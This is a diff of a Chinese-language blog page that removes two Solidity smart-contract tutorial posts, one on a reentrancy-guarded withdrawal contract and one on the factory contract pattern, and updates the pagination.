-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.12</span>;</span><br><span class="line"></span><br><span class="line">contract WithdrawalContract &#123;</span><br><span class="line">    bool reEntrancyMutux = <span class="literal">false</span>;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) buyers;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value &gt; <span class="number">0</span>);</span><br><span class="line">        buyers[msg.sender] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(!reEntrancyMutux);</span><br><span class="line">        uint256 amount = buyers[msg.sender];</span><br><span class="line">        <span class="built_in">require</span>(amount &gt; <span class="number">0</span>);</span><br><span class="line">        buyers[msg.sender] = <span class="number">0</span>;</span><br><span class="line">        reEntrancyMutux = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender.send(amount));</span><br><span class="line">        reEntrancyMutux = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>关联文档：</p>
-<ol>
-<li><a target="_blank" rel="noopener" href="https://willzhuang.github.io/2020/01/15/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-CURD%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/">智能合约-CURD的详细分析</a></li>
-<li><a target="_blank" rel="noopener" href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E8%87%AA%E6%AF%81%E6%A8%A1%E5%BC%8F/">智能合约-自毁模式</a></li>
-<li><a target="_blank" rel="noopener" href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%B7%A5%E5%8E%82%E5%90%88%E7%BA%A6%E6%A8%A1%E5%BC%8F/">智能合约-工厂合约模式</a></li>
-<li><a target="_blank" rel="noopener" href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%90%8D%E5%AD%97%E7%99%BB%E5%BD%95%E6%A8%A1%E5%BC%8F/">智能合约-名字登录模式</a></li>
-<li><a target="_blank" rel="noopener" href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E9%80%80%E6%AC%BE%E6%96%B9%E5%BC%8F/">智能合约-退款方式</a></li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zhuang-weiming.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%B7%A5%E5%8E%82%E5%90%88%E7%BA%A6%E6%A8%A1%E5%BC%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Weiming Zhuang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Zhuang's Diary">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%B7%A5%E5%8E%82%E5%90%88%E7%BA%A6%E6%A8%A1%E5%BC%8F/" class="post-title-link" itemprop="url">智能合约-工厂合约模式</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2020-09-18 14:41:31" itemprop="dateCreated datePublished" datetime="2020-09-18T14:41:31+08:00">2020-09-18</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2020-11-02 18:16:50" itemprop="dateModified" datetime="2020-11-02T18:16:50+08:00">2020-11-02</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.12</span>;</span><br><span class="line"></span><br><span class="line">contract AutoShop &#123;</span><br><span class="line">    address[] autoAssets;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createChildContract</span>(<span class="params">string memory brand, string memory model</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 增加检查：ether是否足够支付 car</span></span><br><span class="line">        address newAutoAsset = address(<span class="keyword">new</span> AutoAsset(brand, model, msg.sender));</span><br><span class="line">        autoAssets.push(newAutoAsset);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getDeployChildContracts</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address[] memory</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> autoAssets;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AutoAsset &#123;</span><br><span class="line">    string brand;</span><br><span class="line">    string model;</span><br><span class="line">    address owner;</span><br><span class="line">    <span class="title">constructor</span>(<span class="params">string memory _brand, string memory _model, address _owner</span>) <span class="title">public</span> &#123;</span><br><span class="line">        brand = _brand;</span><br><span class="line">        model = _model;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>address newAutoAsset = address(new AutoAsset(...)</code> 出发了一个交易，将子合约部署到区块链并返回合约地址。同时，将合约地址存储到数组 <code>address[] autoAssets</code> 中。</p>
-<p>关联文档：</p>
-<ol>
-<li><a target="_blank" rel="noopener" href="https://willzhuang.github.io/2020/01/15/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-CURD%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/">智能合约-CURD的详细分析</a></li>
-<li><a target="_blank" rel="noopener" href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E8%87%AA%E6%AF%81%E6%A8%A1%E5%BC%8F/">智能合约-自毁模式</a></li>
-<li><a target="_blank" rel="noopener" href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%B7%A5%E5%8E%82%E5%90%88%E7%BA%A6%E6%A8%A1%E5%BC%8F/">智能合约-工厂合约模式</a></li>
-<li><a target="_blank" rel="noopener" href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%90%8D%E5%AD%97%E7%99%BB%E5%BD%95%E6%A8%A1%E5%BC%8F/">智能合约-名字登录模式</a></li>
-<li><a target="_blank" rel="noopener" href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E9%80%80%E6%AC%BE%E6%96%B9%E5%BC%8F/">智能合约-退款方式</a></li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/25/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/25/">25</a><span class="page-number current">26</span><a class="page-number" href="/page/27/">27</a><span class="space">&hellip;</span><a class="page-number" href="/page/53/">53</a><a class="extend next" rel="next" href="/page/27/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/25/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/25/">25</a><span class="page-number current">26</span><a class="page-number" href="/page/27/">27</a><span class="space">&hellip;</span><a class="page-number" href="/page/54/">54</a><a class="extend next" rel="next" href="/page/27/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
